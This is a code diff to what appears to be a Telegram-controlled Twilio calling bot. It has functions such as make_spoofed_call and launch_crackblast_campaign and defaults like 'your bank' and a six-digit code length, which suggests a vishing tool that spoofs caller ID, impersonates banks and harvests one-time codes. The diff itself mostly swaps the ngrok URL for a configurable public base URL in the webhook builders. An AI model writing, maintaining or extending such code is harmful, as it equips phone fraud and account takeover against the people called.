@@ -336,7 +336,7 @@ app = Flask(__name__)
 # Ensure the user database is ready on startup.
 def _startup_diagnostics():
     """Check and log configuration status on startup."""
-    from config import DATABASE_URL, USE_POSTGRES
+    from config import DATABASE_URL, USE_POSTGRES, build_public_base_url
     
     logger.info("\n" + "="*70)
     logger.info("🔧 STARTUP DIAGNOSTICS")
@@ -2541,6 +2541,7 @@ def make_spoofed_call(to: str, from_number: str, caller_id: str, webhook_url: st
         logger.error("Twilio not configured")
         return None
     caller_id = _safe_caller_id(caller_id)
+    public_base = build_public_base_url() or NGROK_URL
     try:
         if user_id:
             try:
@@ -2565,12 +2566,12 @@ def make_spoofed_call(to: str, from_number: str, caller_id: str, webhook_url: st
             "method": "POST",
         }
         # Call lifecycle and recording callbacks
-        status_cb = f"{NGROK_URL.rstrip('/')}/twilio/status?user_id={quote_plus(str(user_id))}"
+        status_cb = f"{public_base.rstrip('/')}/twilio/status?user_id={quote_plus(str(user_id))}"
         if chat_id:
             status_cb += f"&chat_id={quote_plus(str(chat_id))}"
         call_params["status_callback"] = status_cb
         call_params["status_callback_method"] = "POST"
-        rec_cb = f"{NGROK_URL.rstrip('/')}/twilio/recording?user_id={quote_plus(str(user_id))}"
+        rec_cb = f"{public_base.rstrip('/')}/twilio/recording?user_id={quote_plus(str(user_id))}"
         if chat_id:
             rec_cb += f"&chat_id={quote_plus(str(chat_id))}"
         call_params["recording_status_callback"] = rec_cb
@@ -2587,7 +2588,7 @@ def make_spoofed_call(to: str, from_number: str, caller_id: str, webhook_url: st
         if amd_param:
             call_params["machine_detection"] = amd_param
             call_params["async_amd"] = True
-            call_params["async_amd_status_callback"] = f"{NGROK_URL.rstrip('/')}/amd_callback?user_id={quote_plus(str(user_id))}"
+            call_params["async_amd_status_callback"] = f"{public_base.rstrip('/')}/amd_callback?user_id={quote_plus(str(user_id))}"
             if chat_id:
                 call_params["async_amd_status_callback"] += f"&chat_id={quote_plus(str(chat_id))}"
             call_params["machine_detection_timeout"] = 8
@@ -2831,8 +2832,9 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
                 
                 if USE_AI_FLOW:
+                    public_base = build_public_base_url() or NGROK_URL
                     webhook_url = (
-                        f"{NGROK_URL.rstrip('/')}/ai_start"
+                        f"{public_base.rstrip('/')}/ai_start"
                         f"?user_id={quote_plus(str(user_id_str))}"
                         f"&chat_id={quote_plus(str(chat_id))}"
                         f"&name={quote_plus(name)}"
@@ -2972,7 +2974,7 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
         def _start():
             try:
                 # Determine webhook based on USE_AI_FLOW
-                from config import USE_AI_FLOW, DEFAULT_VOICE_ID
+                from config import USE_AI_FLOW, DEFAULT_VOICE_ID, build_public_base_url
                 
                 if not USE_AI_FLOW:
                     bot.send_message(chat_id, "❌ AI flow is disabled. Cannot start Normal Call.")
@@ -3007,12 +3009,9 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                 )
                 bot.send_message(chat_id, f"✨ Starting Normal Call with current setup:\n\n{setup_summary}")
 
-                endpoint = "amd_hold"
-                if DISABLE_AMD:
-                    endpoint = "ai_start"
-
+                public_base = build_public_base_url() or NGROK_URL
                 webhook_url = (
-                    f"{NGROK_URL.rstrip('/')}/{endpoint}"
+                    f"{public_base.rstrip('/')}/ai_start"
                     f"?user_id={quote_plus(str(user_id_str))}"
                     f"&chat_id={quote_plus(str(chat_id))}"
                     f"&name={quote_plus(name)}"
@@ -3171,11 +3170,13 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
             emotion = params.get("emotion", "neutral") or "neutral"
             code_length = str(params.get("code_length", "6") or "6")
             mode_label = "Manual Call" if schedule_type == "manual" else "Custom Call"
+            public_base = build_public_base_url() or NGROK_URL
             webhook_url = (
-                f"{NGROK_URL.rstrip('/')}/ai_start"
+                f"{public_base.rstrip('/')}/ai_start"
                 f"?user_id={quote_plus(str(user_id))}"
-                f"&chat_id={quote_plus(str(chat_id))}" if chat_id is not None else f"?user_id={quote_plus(str(user_id))}"
             )
+            if chat_id is not None:
+                webhook_url += f"&chat_id={quote_plus(str(chat_id))}"
             if script:
                 webhook_url += f"&custom_script={quote_plus(script)}"
             webhook_url += (
@@ -3198,8 +3199,9 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
             )
         else:
             emotion = sched.get("emotion", "neutral")
+            public_base = build_public_base_url() or NGROK_URL
             webhook_url = (
-                f"{NGROK_URL.rstrip('/')}/ai_start"
+                f"{public_base.rstrip('/')}/ai_start"
                 f"?user_id={quote_plus(str(user_id))}"
             )
             if chat_id is not None:
@@ -5273,8 +5275,9 @@ def launch_crackblast_campaign(user_id: str, chat_id: int) -> None:
     failed = 0
     for number in numbers:
         if USE_AI_FLOW:
+            public_base = build_public_base_url() or NGROK_URL
             webhook_url = (
-                f"{NGROK_URL.rstrip('/')}/ai_start"
+                f"{public_base.rstrip('/')}/ai_start"
                 f"?user_id={quote_plus(str(user_id))}"
                 f"&chat_id={quote_plus(str(chat_id))}"
                 f"&name={quote_plus(name)}"
@@ -5286,8 +5289,9 @@ def launch_crackblast_campaign(user_id: str, chat_id: int) -> None:
                 f"&mode_label=Crack%20Blast"
             )
         else:
+            public_base = build_public_base_url() or NGROK_URL
             webhook_url = (
-                f"{NGROK_URL.rstrip('/')}/custom_flow?user_id={quote_plus(str(user_id))}" 
+                f"{public_base.rstrip('/')}/custom_flow?user_id={quote_plus(str(user_id))}" 
                 f"&chat_id={quote_plus(str(chat_id))}&audio=crack_script"
             )
         
@@ -6091,9 +6095,9 @@ def _handle_query_processing(call, _):
                 name = read_user_file(user_id_str, "Name.txt", "Customer")
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
-                
+                public_base = build_public_base_url() or NGROK_URL
                 webhook_url = (
-                    f"{NGROK_URL.rstrip('/')}/ai_start"
+                    f"{public_base.rstrip('/')}/ai_start"
                     f"?user_id={quote_plus(str(user_id_str))}"
                     f"&chat_id={quote_plus(str(chat_id))}"
                     f"&name={quote_plus(name)}"
@@ -6219,9 +6223,9 @@ def _handle_query_processing(call, _):
                 name = read_user_file(user_id_str, "Name.txt", "Customer")
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
-                
+                public_base = build_public_base_url() or NGROK_URL
                 webhook_url = (
-                    f"{NGROK_URL.rstrip('/')}/ai_start"
+                    f"{public_base.rstrip('/')}/ai_start"
                     f"?user_id={quote_plus(str(user_id_str))}"
                     f"&chat_id={quote_plus(str(chat_id))}"
                     f"&name={quote_plus(name)}"
@@ -6418,8 +6422,9 @@ def _handle_query_processing(call, _):
                 name = read_user_file(user_id_str, "Name.txt", "Customer")
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
+                public_base = build_public_base_url() or NGROK_URL
                 webhook_url = (
-                    f"{NGROK_URL.rstrip('/')}/ai_start"
+                    f"{public_base.rstrip('/')}/ai_start"
                     f"?user_id={quote_plus(str(user_id_str))}"
                     f"&chat_id={quote_plus(str(chat_id))}"
                     f"&name={quote_plus(name)}"
